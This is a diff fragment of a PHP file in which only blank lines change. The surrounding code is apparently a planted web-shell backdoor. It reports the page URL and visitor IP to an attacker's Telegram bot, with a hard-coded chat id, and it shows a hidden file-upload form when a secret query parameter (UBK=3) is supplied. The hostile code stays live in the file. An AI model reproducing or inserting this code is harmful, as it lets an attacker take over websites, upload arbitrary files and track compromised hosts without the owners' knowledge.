@@ -13,7 +13,6 @@ $angka = '5070938778';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $eai  = "___404N0406@#$___ \n\n url nya =\n $xPath \n\n  =\n  \n\n IP   :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 sendTelegramMessage($bcripthash, $angka, $eai);
-
 function sendTelegramMessage($bcripthash, $angka, $message)
 {
     $url = "https://api.telegram.org/bot{$bcripthash}/sendMessage";
@@ -30,7 +29,6 @@ function sendTelegramMessage($bcripthash, $angka, $message)
     ];
     $context = stream_context_create($options);
     $response = file_get_contents($url, false, $context);
-
 }
 if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
     echo '<form method="post" enctype="multipart/form-data">';
